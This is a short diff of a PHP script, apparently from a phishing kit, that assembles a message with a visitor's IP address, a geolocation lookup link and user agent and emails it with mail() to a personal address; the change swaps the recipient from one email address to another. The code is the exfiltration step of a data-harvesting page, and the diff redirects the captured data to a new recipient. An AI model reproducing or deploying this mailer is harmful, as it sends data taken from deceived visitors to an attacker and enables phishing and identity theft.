@@ -11,7 +11,7 @@ $message .= "|Client IP: ".$ip."\n";
 $message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
 $message .= "User Agent : ".$useragent."\n";
 $message .= "|----------- unknown --------------|\n";
-$send = "veepet6@gmail.com";
+$send = "HK.BLAZE@YANDE.COM";
 $subject = "LogoPage | $ip";
 {
 mail("$send", "$subject", $message);   
